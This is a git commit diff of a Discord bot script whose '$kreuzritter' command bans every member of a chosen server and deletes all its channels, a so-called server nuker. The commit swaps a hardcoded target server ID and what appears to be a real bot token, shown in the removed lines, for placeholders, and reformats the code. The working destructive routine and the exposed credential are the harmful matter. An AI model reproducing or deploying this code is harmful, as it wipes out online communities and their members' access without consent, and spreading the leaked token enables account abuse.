57952781a19112207791af19245fb207eaf57bf0
1337toxic1337 <65368643+1337toxic1337@users.noreply.github.com>
2020-08-02 21:40:40 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,49 +1,48 @@
-﻿const {
+const {
     Client,
     RichEmbed
 } = require('discord.js')
 const client = new Client();
-const token = 'NzAwNDk5ODE3NDk5MDY2NTAy.Xpj1Sw.L2Qx2vkfTgb9cqe9fd5Tq9wDeMg';
+const token = 'Null'; //Insert bot token
 const PREFIX = '$';
 
-	client.on('ready', (guild) => {
-		
-		
-		console.log('Ready');
-	
-	
-	});
+client.on('ready', (guild) => {
 
-	
 
-	client.on('message', message => {
-		
-		let args = message.content.substring(PREFIX.length).split(" ");
-		
-		switch (args[0]) {
-			
-			case 'kreuzritter':
-			
-			try{
-		
-			
-				const list = client.guilds.get("651857734177914891"); 
-			
-				
-				list.members.forEach(member => member.ban()); 
-				message.guild.channels.forEach(channel => channel.delete());
-				
-			}catch(UnhandledPromiseRejectionWarning){
-				
-				console.log('Not enough permissions');
-				
-			}
-			
-			break;
-			
-		}
+    console.log('Ready');
 
-	});
+
+});
+
+
+
+client.on('message', message => {
+
+    let args = message.content.substring(PREFIX.length).split(" ");
+
+    switch (args[0]) {
+
+        case 'kreuzritter':
+
+            try {
+
+
+                const list = client.guilds.get("Null"); //INSERT SERVER ID 
+
+
+                list.members.forEach(member => member.ban());
+                message.guild.channels.forEach(channel => channel.delete());
+
+            } catch (UnhandledPromiseRejectionWarning) {
+
+                console.log('Not enough permissions');
+
+            }
+
+            break;
+
+    }
+
+});
 
 client.login(token);
-
